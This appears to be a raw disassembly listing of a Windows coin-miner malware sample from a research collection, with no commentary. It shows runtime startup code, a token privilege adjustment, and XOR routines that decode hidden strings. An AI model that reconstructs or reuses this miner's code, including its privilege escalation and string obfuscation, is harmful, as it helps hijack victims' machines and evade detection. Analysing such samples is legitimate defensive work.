
malware_samples/miner/c45f7a52901b74e468b972cf7deb31297a5b5ad52c43fd2f73be3bede5ffd269.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000100d:	00 00 00 
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 c5 8b 38 00 	mov    0x388bc5(%rip),%rax        # 0x140389be0
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 c6 8b 38 00 	mov    0x388bc6(%rip),%rax        # 0x140389bf0
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 c9 8b 38 00 	mov    0x388bc9(%rip),%rax        # 0x140389c00
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 3c 8b 38 00 	mov    0x388b3c(%rip),%rax        # 0x140389b80
   140001044:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001049:	75 0f                	jne    0x14000105a
   14000104b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000104f:	48 01 d0             	add    %rdx,%rax
   140001052:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001058:	74 66                	je     0x1400010c0
   14000105a:	48 8b 05 6f 8b 38 00 	mov    0x388b6f(%rip),%rax        # 0x140389bd0
   140001061:	89 0d a5 af 38 00    	mov    %ecx,0x38afa5(%rip)        # 0x14038c00c
   140001067:	8b 00                	mov    (%rax),%eax
   140001069:	85 c0                	test   %eax,%eax
   14000106b:	75 43                	jne    0x1400010b0
   14000106d:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001072:	e8 a9 a9 00 00       	call   0x14000ba20
   140001077:	e8 84 a5 00 00       	call   0x14000b600
   14000107c:	48 8b 15 3d 8c 38 00 	mov    0x388c3d(%rip),%rdx        # 0x140389cc0
   140001083:	8b 12                	mov    (%rdx),%edx
   140001085:	89 10                	mov    %edx,(%rax)
   140001087:	e8 84 a5 00 00       	call   0x14000b610
   14000108c:	48 8b 15 0d 8c 38 00 	mov    0x388c0d(%rip),%rdx        # 0x140389ca0
   140001093:	8b 12                	mov    (%rdx),%edx
   140001095:	89 10                	mov    %edx,(%rax)
   140001097:	e8 84 44 00 00       	call   0x140005520
   14000109c:	48 8b 05 8d 8a 38 00 	mov    0x388a8d(%rip),%rax        # 0x140389b30
   1400010a3:	83 38 01             	cmpl   $0x1,(%rax)
   1400010a6:	74 49                	je     0x1400010f1
   1400010a8:	31 c0                	xor    %eax,%eax
   1400010aa:	48 83 c4 28          	add    $0x28,%rsp
   1400010ae:	c3                   	ret
   1400010af:	90                   	nop
   1400010b0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010b5:	e8 66 a9 00 00       	call   0x14000ba20
   1400010ba:	eb bb                	jmp    0x140001077
   1400010bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010c9:	74 39                	je     0x140001104
   1400010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d0:	75 88                	jne    0x14000105a
   1400010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010d9:	0f 86 7b ff ff ff    	jbe    0x14000105a
   1400010df:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010e5:	31 c9                	xor    %ecx,%ecx
   1400010e7:	85 d2                	test   %edx,%edx
   1400010e9:	0f 95 c1             	setne  %cl
   1400010ec:	e9 69 ff ff ff       	jmp    0x14000105a
   1400010f1:	48 8d 0d 28 43 00 00 	lea    0x4328(%rip),%rcx        # 0x140005420
   1400010f8:	e8 73 4a 00 00       	call   0x140005b70
   1400010fd:	31 c0                	xor    %eax,%eax
   1400010ff:	48 83 c4 28          	add    $0x28,%rsp
   140001103:	c3                   	ret
   140001104:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001108:	0f 86 4c ff ff ff    	jbe    0x14000105a
   14000110e:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001115:	31 c9                	xor    %ecx,%ecx
   140001117:	45 85 c0             	test   %r8d,%r8d
   14000111a:	0f 95 c1             	setne  %cl
   14000111d:	e9 38 ff ff ff       	jmp    0x14000105a
   140001122:	0f 1f 40 00          	nopl   0x0(%rax)
   140001126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000112d:	00 00 00 
   140001130:	48 83 ec 38          	sub    $0x38,%rsp
   140001134:	48 8b 05 b5 8b 38 00 	mov    0x388bb5(%rip),%rax        # 0x140389cf0
   14000113b:	4c 8d 05 d6 ae 38 00 	lea    0x38aed6(%rip),%r8        # 0x14038c018
   140001142:	48 8d 15 d7 ae 38 00 	lea    0x38aed7(%rip),%rdx        # 0x14038c020
   140001149:	48 8d 0d d8 ae 38 00 	lea    0x38aed8(%rip),%rcx        # 0x14038c028
   140001150:	8b 00                	mov    (%rax),%eax
   140001152:	89 05 ac ae 38 00    	mov    %eax,0x38aeac(%rip)        # 0x14038c004
   140001158:	48 8d 05 a5 ae 38 00 	lea    0x38aea5(%rip),%rax        # 0x14038c004
   14000115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001164:	48 8b 05 45 8b 38 00 	mov    0x388b45(%rip),%rax        # 0x140389cb0
   14000116b:	44 8b 08             	mov    (%rax),%r9d
   14000116e:	e8 bd a8 00 00       	call   0x14000ba30
   140001173:	90                   	nop
   140001174:	48 83 c4 38          	add    $0x38,%rsp
   140001178:	c3                   	ret
   140001179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001180:	41 55                	push   %r13
   140001182:	41 54                	push   %r12
   140001184:	55                   	push   %rbp
   140001185:	57                   	push   %rdi
   140001186:	56                   	push   %rsi
   140001187:	53                   	push   %rbx
   140001188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000118f:	48 8b 35 3a 8a 38 00 	mov    0x388a3a(%rip),%rsi        # 0x140389bd0
   140001196:	31 c0                	xor    %eax,%eax
   140001198:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000119d:	44 8b 0e             	mov    (%rsi),%r9d
   1400011a0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400011a5:	48 89 d7             	mov    %rdx,%rdi
   1400011a8:	f3 48 ab             	rep stos %rax,(%rdi)
   1400011ab:	45 85 c9             	test   %r9d,%r9d
   1400011ae:	0f 85 cc 02 00 00    	jne    0x140001480
   1400011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400011bb:	00 00 
   1400011bd:	48 8b 1d 6c 8a 38 00 	mov    0x388a6c(%rip),%rbx        # 0x140389c30
   1400011c4:	31 ed                	xor    %ebp,%ebp
   1400011c6:	48 8b 78 08          	mov    0x8(%rax),%rdi
   1400011ca:	4c 8b 25 db c0 38 00 	mov    0x38c0db(%rip),%r12        # 0x14038d2ac
   1400011d1:	eb 11                	jmp    0x1400011e4
   1400011d3:	48 39 c7             	cmp    %rax,%rdi
   1400011d6:	0f 84 44 02 00 00    	je     0x140001420
   1400011dc:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011e1:	41 ff d4             	call   *%r12
   1400011e4:	48 89 e8             	mov    %rbp,%rax
   1400011e7:	f0 48 0f b1 3b       	lock cmpxchg %rdi,(%rbx)
   1400011ec:	48 85 c0             	test   %rax,%rax
   1400011ef:	75 e2                	jne    0x1400011d3
   1400011f1:	48 8b 3d 48 8a 38 00 	mov    0x388a48(%rip),%rdi        # 0x140389c40
   1400011f8:	31 ed                	xor    %ebp,%ebp
   1400011fa:	8b 07                	mov    (%rdi),%eax
   1400011fc:	83 f8 01             	cmp    $0x1,%eax
   1400011ff:	0f 84 32 02 00 00    	je     0x140001437
   140001205:	8b 07                	mov    (%rdi),%eax
   140001207:	85 c0                	test   %eax,%eax
   140001209:	0f 84 a1 02 00 00    	je     0x1400014b0
   14000120f:	c7 05 ef ad 38 00 01 	movl   $0x1,0x38adef(%rip)        # 0x14038c008
   140001216:	00 00 00 
   140001219:	8b 07                	mov    (%rdi),%eax
   14000121b:	83 f8 01             	cmp    $0x1,%eax
   14000121e:	0f 84 28 02 00 00    	je     0x14000144c
   140001224:	85 ed                	test   %ebp,%ebp
   140001226:	0f 84 41 02 00 00    	je     0x14000146d
   14000122c:	48 8b 05 3d 89 38 00 	mov    0x38893d(%rip),%rax        # 0x140389b70
   140001233:	48 8b 00             	mov    (%rax),%rax
   140001236:	48 85 c0             	test   %rax,%rax
   140001239:	74 0c                	je     0x140001247
   14000123b:	45 31 c0             	xor    %r8d,%r8d
   14000123e:	ba 02 00 00 00       	mov    $0x2,%edx
   140001243:	31 c9                	xor    %ecx,%ecx
   140001245:	ff d0                	call   *%rax
   140001247:	e8 64 45 00 00       	call   0x1400057b0
   14000124c:	48 8d 0d 2d 49 00 00 	lea    0x492d(%rip),%rcx        # 0x140005b80
   140001253:	ff 15 4b c0 38 00    	call   *0x38c04b(%rip)        # 0x14038d2a4
   140001259:	48 8b 15 c0 89 38 00 	mov    0x3889c0(%rip),%rdx        # 0x140389c20
   140001260:	48 8d 0d 99 fd ff ff 	lea    -0x267(%rip),%rcx        # 0x140001000
   140001267:	48 89 02             	mov    %rax,(%rdx)
   14000126a:	e8 c1 a3 00 00       	call   0x14000b630
   14000126f:	e8 bc 42 00 00       	call   0x140005530
   140001274:	48 8b 05 05 89 38 00 	mov    0x388905(%rip),%rax        # 0x140389b80
   14000127b:	48 89 05 96 b9 38 00 	mov    %rax,0x38b996(%rip)        # 0x14038cc18
   140001282:	e8 69 a3 00 00       	call   0x14000b5f0
   140001287:	31 c9                	xor    %ecx,%ecx
   140001289:	48 8b 00             	mov    (%rax),%rax
   14000128c:	48 85 c0             	test   %rax,%rax
   14000128f:	75 15                	jne    0x1400012a6
   140001291:	eb 54                	jmp    0x1400012e7
   140001293:	66 85 d2             	test   %dx,%dx
   140001296:	74 28                	je     0x1400012c0
   140001298:	83 e1 01             	and    $0x1,%ecx
   14000129b:	74 23                	je     0x1400012c0
   14000129d:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400012a2:	48 83 c0 02          	add    $0x2,%rax
   1400012a6:	0f b7 10             	movzwl (%rax),%edx
   1400012a9:	66 83 fa 20          	cmp    $0x20,%dx
   1400012ad:	76 e4                	jbe    0x140001293
   1400012af:	41 89 c8             	mov    %ecx,%r8d
   1400012b2:	41 83 f0 01          	xor    $0x1,%r8d
   1400012b6:	66 83 fa 22          	cmp    $0x22,%dx
   1400012ba:	41 0f 44 c8          	cmove  %r8d,%ecx
   1400012be:	eb e2                	jmp    0x1400012a2
   1400012c0:	83 ea 01             	sub    $0x1,%edx
   1400012c3:	66 83 fa 1f          	cmp    $0x1f,%dx
   1400012c7:	77 17                	ja     0x1400012e0
   1400012c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400012d0:	48 83 c0 02          	add    $0x2,%rax
   1400012d4:	0f b7 18             	movzwl (%rax),%ebx
   1400012d7:	8d 53 ff             	lea    -0x1(%rbx),%edx
   1400012da:	66 83 fa 1f          	cmp    $0x1f,%dx
   1400012de:	76 f0                	jbe    0x1400012d0
   1400012e0:	48 89 05 29 b9 38 00 	mov    %rax,0x38b929(%rip)        # 0x14038cc10
   1400012e7:	44 8b 06             	mov    (%rsi),%r8d
   1400012ea:	45 85 c0             	test   %r8d,%r8d
   1400012ed:	0f 85 9d 00 00 00    	jne    0x140001390
   1400012f3:	8b 1d 2f ad 38 00    	mov    0x38ad2f(%rip),%ebx        # 0x14038c028
   1400012f9:	44 8d 6b 01          	lea    0x1(%rbx),%r13d
   1400012fd:	4d 63 ed             	movslq %r13d,%r13
   140001300:	49 c1 e5 03          	shl    $0x3,%r13
   140001304:	4c 89 e9             	mov    %r13,%rcx
   140001307:	e8 b4 a7 00 00       	call   0x14000bac0
   14000130c:	85 db                	test   %ebx,%ebx
   14000130e:	48 8b 3d 0b ad 38 00 	mov    0x38ad0b(%rip),%rdi        # 0x14038c020
   140001315:	48 89 c5             	mov    %rax,%rbp
   140001318:	0f 8e 97 00 00 00    	jle    0x1400013b5
   14000131e:	44 8d 63 ff          	lea    -0x1(%rbx),%r12d
   140001322:	31 f6                	xor    %esi,%esi
   140001324:	48 8b 04 f7          	mov    (%rdi,%rsi,8),%rax
   140001328:	66 83 38 00          	cmpw   $0x0,(%rax)
   14000132c:	74 55                	je     0x140001383
   14000132e:	66 90                	xchg   %ax,%ax
   140001330:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001336:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000133d:	00 00 00 
   140001340:	49 83 c0 01          	add    $0x1,%r8
   140001344:	66 42 83 7c 40 fe 00 	cmpw   $0x0,-0x2(%rax,%r8,2)
   14000134b:	75 f3                	jne    0x140001340
   14000134d:	4b 8d 1c 00          	lea    (%r8,%r8,1),%rbx
   140001351:	48 89 d9             	mov    %rbx,%rcx
   140001354:	e8 67 a7 00 00       	call   0x14000bac0
   140001359:	49 89 d8             	mov    %rbx,%r8
   14000135c:	48 89 44 f5 00       	mov    %rax,0x0(%rbp,%rsi,8)
   140001361:	48 8b 14 f7          	mov    (%rdi,%rsi,8),%rdx
   140001365:	48 89 c1             	mov    %rax,%rcx
   140001368:	e8 5b a7 00 00       	call   0x14000bac8
   14000136d:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140001371:	49 39 f4             	cmp    %rsi,%r12
   140001374:	74 3a                	je     0x1400013b0
   140001376:	48 89 c6             	mov    %rax,%rsi
   140001379:	48 8b 04 f7          	mov    (%rdi,%rsi,8),%rax
   14000137d:	66 83 38 00          	cmpw   $0x0,(%rax)
   140001381:	75 ad                	jne    0x140001330
   140001383:	bb 02 00 00 00       	mov    $0x2,%ebx
   140001388:	eb c7                	jmp    0x140001351
   14000138a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001390:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140001395:	b8 0a 00 00 00       	mov    $0xa,%eax
   14000139a:	74 05                	je     0x1400013a1
   14000139c:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
   1400013a1:	89 05 59 ac 00 00    	mov    %eax,0xac59(%rip)        # 0x14000c000
   1400013a7:	e9 47 ff ff ff       	jmp    0x1400012f3
   1400013ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400013b0:	4a 8d 44 2d f8       	lea    -0x8(%rbp,%r13,1),%rax
   1400013b5:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   1400013bc:	48 89 2d 5d ac 38 00 	mov    %rbp,0x38ac5d(%rip)        # 0x14038c020
   1400013c3:	e8 78 3f 00 00       	call   0x140005340
   1400013c8:	48 8b 05 c1 87 38 00 	mov    0x3887c1(%rip),%rax        # 0x140389b90
   1400013cf:	4c 8b 05 42 ac 38 00 	mov    0x38ac42(%rip),%r8        # 0x14038c018
   1400013d6:	8b 0d 4c ac 38 00    	mov    0x38ac4c(%rip),%ecx        # 0x14038c028
   1400013dc:	48 8b 00             	mov    (%rax),%rax
   1400013df:	4c 89 00             	mov    %r8,(%rax)
   1400013e2:	48 8b 15 37 ac 38 00 	mov    0x38ac37(%rip),%rdx        # 0x14038c020
   1400013e9:	e8 a2 05 00 00       	call   0x140001990
   1400013ee:	8b 0d 18 ac 38 00    	mov    0x38ac18(%rip),%ecx        # 0x14038c00c
   1400013f4:	89 05 16 ac 38 00    	mov    %eax,0x38ac16(%rip)        # 0x14038c010
   1400013fa:	85 c9                	test   %ecx,%ecx
   1400013fc:	0f 84 cc 00 00 00    	je     0x1400014ce
   140001402:	8b 15 00 ac 38 00    	mov    0x38ac00(%rip),%edx        # 0x14038c008
   140001408:	85 d2                	test   %edx,%edx
   14000140a:	0f 84 80 00 00 00    	je     0x140001490
   140001410:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140001417:	5b                   	pop    %rbx
   140001418:	5e                   	pop    %rsi
   140001419:	5f                   	pop    %rdi
   14000141a:	5d                   	pop    %rbp
   14000141b:	41 5c                	pop    %r12
   14000141d:	41 5d                	pop    %r13
   14000141f:	c3                   	ret
   140001420:	48 8b 3d 19 88 38 00 	mov    0x388819(%rip),%rdi        # 0x140389c40
   140001427:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000142c:	8b 07                	mov    (%rdi),%eax
   14000142e:	83 f8 01             	cmp    $0x1,%eax
   140001431:	0f 85 ce fd ff ff    	jne    0x140001205
   140001437:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000143c:	e8 f7 a5 00 00       	call   0x14000ba38
   140001441:	8b 07                	mov    (%rdi),%eax
   140001443:	83 f8 01             	cmp    $0x1,%eax
   140001446:	0f 85 d8 fd ff ff    	jne    0x140001224
   14000144c:	48 8b 15 1d 88 38 00 	mov    0x38881d(%rip),%rdx        # 0x140389c70
   140001453:	48 8b 0d 06 88 38 00 	mov    0x388806(%rip),%rcx        # 0x140389c60
   14000145a:	e8 f9 a5 00 00       	call   0x14000ba58
   14000145f:	85 ed                	test   %ebp,%ebp
   140001461:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   140001467:	0f 85 bf fd ff ff    	jne    0x14000122c
   14000146d:	31 c0                	xor    %eax,%eax
   14000146f:	48 87 03             	xchg   %rax,(%rbx)
   140001472:	e9 b5 fd ff ff       	jmp    0x14000122c
   140001477:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000147e:	00 00 
   140001480:	48 89 d1             	mov    %rdx,%rcx
   140001483:	ff 15 e3 bd 38 00    	call   *0x38bde3(%rip)        # 0x14038d26c
   140001489:	e9 26 fd ff ff       	jmp    0x1400011b4
   14000148e:	66 90                	xchg   %ax,%ax
   140001490:	e8 b3 a5 00 00       	call   0x14000ba48
   140001495:	8b 05 75 ab 38 00    	mov    0x38ab75(%rip),%eax        # 0x14038c010
   14000149b:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400014a2:	5b                   	pop    %rbx
   1400014a3:	5e                   	pop    %rsi
   1400014a4:	5f                   	pop    %rdi
   1400014a5:	5d                   	pop    %rbp
   1400014a6:	41 5c                	pop    %r12
   1400014a8:	41 5d                	pop    %r13
   1400014aa:	c3                   	ret
   1400014ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014b0:	48 8b 15 d9 87 38 00 	mov    0x3887d9(%rip),%rdx        # 0x140389c90
   1400014b7:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400014bd:	48 8b 0d bc 87 38 00 	mov    0x3887bc(%rip),%rcx        # 0x140389c80
   1400014c4:	e8 8f a5 00 00       	call   0x14000ba58
   1400014c9:	e9 4b fd ff ff       	jmp    0x140001219
   1400014ce:	89 c1                	mov    %eax,%ecx
   1400014d0:	e8 b3 a5 00 00       	call   0x14000ba88
   1400014d5:	90                   	nop
   1400014d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400014dd:	00 00 00 
   1400014e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400014e4:	48 8b 05 e5 86 38 00 	mov    0x3886e5(%rip),%rax        # 0x140389bd0
   1400014eb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400014f1:	e8 8a fc ff ff       	call   0x140001180
   1400014f6:	90                   	nop
   1400014f7:	90                   	nop
   1400014f8:	48 83 c4 28          	add    $0x28,%rsp
   1400014fc:	c3                   	ret
   1400014fd:	0f 1f 00             	nopl   (%rax)
   140001500:	48 83 ec 28          	sub    $0x28,%rsp
   140001504:	48 8b 05 c5 86 38 00 	mov    0x3886c5(%rip),%rax        # 0x140389bd0
   14000150b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001511:	e8 6a fc ff ff       	call   0x140001180
   140001516:	90                   	nop
   140001517:	90                   	nop
   140001518:	48 83 c4 28          	add    $0x28,%rsp
   14000151c:	c3                   	ret
   14000151d:	0f 1f 00             	nopl   (%rax)
   140001520:	48 83 ec 28          	sub    $0x28,%rsp
   140001524:	e8 37 a5 00 00       	call   0x14000ba60
   140001529:	48 85 c0             	test   %rax,%rax
   14000152c:	0f 94 c0             	sete   %al
   14000152f:	0f b6 c0             	movzbl %al,%eax
   140001532:	f7 d8                	neg    %eax
   140001534:	48 83 c4 28          	add    $0x28,%rsp
   140001538:	c3                   	ret
   140001539:	90                   	nop
   14000153a:	90                   	nop
   14000153b:	90                   	nop
   14000153c:	90                   	nop
   14000153d:	90                   	nop
   14000153e:	90                   	nop
   14000153f:	90                   	nop
   140001540:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001550
   140001547:	e9 d4 ff ff ff       	jmp    0x140001520
   14000154c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001550:	c3                   	ret
   140001551:	90                   	nop
   140001552:	90                   	nop
   140001553:	90                   	nop
   140001554:	90                   	nop
   140001555:	90                   	nop
   140001556:	90                   	nop
   140001557:	90                   	nop
   140001558:	90                   	nop
   140001559:	90                   	nop
   14000155a:	90                   	nop
   14000155b:	90                   	nop
   14000155c:	90                   	nop
   14000155d:	90                   	nop
   14000155e:	90                   	nop
   14000155f:	90                   	nop
   140001560:	53                   	push   %rbx
   140001561:	48 83 ec 50          	sub    $0x50,%rsp
   140001565:	0f b6 15 c4 aa 38 00 	movzbl 0x38aac4(%rip),%edx        # 0x14038c030
   14000156c:	84 d2                	test   %dl,%dl
   14000156e:	48 89 cb             	mov    %rcx,%rbx
   140001571:	74 3d                	je     0x1400015b0
   140001573:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140001577:	74 04                	je     0x14000157d
   140001579:	84 d2                	test   %dl,%dl
   14000157b:	75 0b                	jne    0x140001588
   14000157d:	48 83 c4 50          	add    $0x50,%rsp
   140001581:	5b                   	pop    %rbx
   140001582:	c3                   	ret
   140001583:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001588:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000158e:	ba 1d 00 00 00       	mov    $0x1d,%edx
   140001593:	48 89 d9             	mov    %rbx,%rcx
   140001596:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000159d:	00 
   14000159e:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400015a3:	e8 93 3b 00 00       	call   0x14000513b
   1400015a8:	90                   	nop
   1400015a9:	48 83 c4 50          	add    $0x50,%rsp
   1400015ad:	5b                   	pop    %rbx
   1400015ae:	c3                   	ret
   1400015af:	90                   	nop
   1400015b0:	48 8b 05 49 7a 38 00 	mov    0x387a49(%rip),%rax        # 0x140389000
   1400015b7:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1400015bc:	ba 28 00 00 00       	mov    $0x28,%edx
   1400015c1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400015c8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400015cf:	00 00 
   1400015d1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400015d6:	48 b8 00 00 00 00 02 	movabs $0x200000000,%rax
   1400015dd:	00 00 00 
   1400015e0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400015e5:	e8 41 3c 00 00       	call   0x14000522b
   1400015ea:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400015ef:	31 d2                	xor    %edx,%edx
   1400015f1:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400015f8:	00 00 
   1400015fa:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001601:	00 00 
   140001603:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001608:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   14000160e:	e8 5a 3c 00 00       	call   0x14000526d
   140001613:	f7 d0                	not    %eax
   140001615:	c1 e8 1f             	shr    $0x1f,%eax
   140001618:	89 c2                	mov    %eax,%edx
   14000161a:	88 05 10 aa 38 00    	mov    %al,0x38aa10(%rip)        # 0x14038c030
   140001620:	e9 4e ff ff ff       	jmp    0x140001573
   140001625:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000162c:	00 00 00 00 
   140001630:	41 57                	push   %r15
   140001632:	41 56                	push   %r14
   140001634:	41 55                	push   %r13
   140001636:	41 54                	push   %r12
   140001638:	55                   	push   %rbp
   140001639:	57                   	push   %rdi
   14000163a:	56                   	push   %rsi
   14000163b:	53                   	push   %rbx
   14000163c:	48 81 ec 68 02 00 00 	sub    $0x268,%rsp
   140001643:	44 8b ac 24 e0 02 00 	mov    0x2e0(%rsp),%r13d
   14000164a:	00 
   14000164b:	48 89 d7             	mov    %rdx,%rdi
   14000164e:	4c 89 c5             	mov    %r8,%rbp
   140001651:	4c 89 ce             	mov    %r9,%rsi
   140001654:	e8 b7 2a 00 00       	call   0x140004110
   140001659:	84 c0                	test   %al,%al
   14000165b:	74 1b                	je     0x140001678
   14000165d:	48 81 c4 68 02 00 00 	add    $0x268,%rsp
   140001664:	5b                   	pop    %rbx
   140001665:	5e                   	pop    %rsi
   140001666:	5f                   	pop    %rdi
   140001667:	5d                   	pop    %rbp
   140001668:	41 5c                	pop    %r12
   14000166a:	41 5d                	pop    %r13
   14000166c:	41 5e                	pop    %r14
   14000166e:	41 5f                	pop    %r15
   140001670:	c3                   	ret
   140001671:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001678:	4c 8d 74 24 50       	lea    0x50(%rsp),%r14
   14000167d:	31 d2                	xor    %edx,%edx
   14000167f:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001685:	4c 89 f1             	mov    %r14,%rcx
   140001688:	e8 43 a4 00 00       	call   0x14000bad0
   14000168d:	48 8b 05 8c 79 38 00 	mov    0x38798c(%rip),%rax        # 0x140389020
   140001694:	48 8d 0d a5 be 00 00 	lea    0xbea5(%rip),%rcx        # 0x14000d540
   14000169b:	66 0f 6f 05 6d 79 38 	movdqa 0x38796d(%rip),%xmm0        # 0x140389010
   1400016a2:	00 
   1400016a3:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1400016a8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400016ad:	8b 05 75 79 38 00    	mov    0x387975(%rip),%eax        # 0x140389028
   1400016b3:	89 44 24 48          	mov    %eax,0x48(%rsp)
   1400016b7:	e8 e4 51 00 00       	call   0x1400068a0
   1400016bc:	48 8d 0d 5d be 00 00 	lea    0xbe5d(%rip),%rcx        # 0x14000d520
   1400016c3:	49 89 c4             	mov    %rax,%r12
   1400016c6:	e8 d5 51 00 00       	call   0x1400068a0
   1400016cb:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   1400016d0:	48 89 c3             	mov    %rax,%rbx
   1400016d3:	75 3c                	jne    0x140001711
   1400016d5:	c6 40 1c 01          	movb   $0x1,0x1c(%rax)
   1400016d9:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400016de:	45 31 c0             	xor    %r8d,%r8d
   1400016e1:	48 89 da             	mov    %rbx,%rdx
   1400016e4:	48 8d 0d c5 a5 00 00 	lea    0xa5c5(%rip),%rcx        # 0x14000bcb0
   1400016eb:	48 89 03             	mov    %rax,(%rbx)
   1400016ee:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400016f3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400016f7:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400016fc:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001700:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140001704:	89 43 18             	mov    %eax,0x18(%rbx)
   140001707:	41 c6 04 24 01       	movb   $0x1,(%r12)
   14000170c:	e8 cf 48 00 00       	call   0x140005fe0
   140001711:	80 7b 1c 00          	cmpb   $0x0,0x1c(%rbx)
   140001715:	74 2a                	je     0x140001741
   140001717:	48 b8 cf 2f 2f ff ff 	movabs $0xed9595ffff2f2fcf,%rax
   14000171e:	95 95 ed 
   140001721:	c6 43 1c 00          	movb   $0x0,0x1c(%rbx)
   140001725:	48 ba ed 39 39 43 43 	movabs $0xf1f143433939ed,%rdx
   14000172c:	f1 f1 00 
   14000172f:	48 31 03             	xor    %rax,(%rbx)
   140001732:	48 31 53 08          	xor    %rdx,0x8(%rbx)
   140001736:	48 31 43 10          	xor    %rax,0x10(%rbx)
   14000173a:	81 73 18 ed 39 39 43 	xorl   $0x433939ed,0x18(%rbx)
   140001741:	48 8b 05 e8 78 38 00 	mov    0x3878e8(%rip),%rax        # 0x140389030
   140001748:	ba ed 39 00 00       	mov    $0x39ed,%edx
   14000174d:	48 8d 0d ac bd 00 00 	lea    0xbdac(%rip),%rcx        # 0x14000d500
   140001754:	66 89 54 24 38       	mov    %dx,0x38(%rsp)
   140001759:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000175e:	e8 3d 51 00 00       	call   0x1400068a0
   140001763:	48 8d 0d 76 bd 00 00 	lea    0xbd76(%rip),%rcx        # 0x14000d4e0
   14000176a:	49 89 c7             	mov    %rax,%r15
   14000176d:	e8 2e 51 00 00       	call   0x1400068a0
   140001772:	41 80 3f 00          	cmpb   $0x0,(%r15)
   140001776:	49 89 c4             	mov    %rax,%r12
   140001779:	75 2e                	jne    0x1400017a9
   14000177b:	c6 40 0a 01          	movb   $0x1,0xa(%rax)
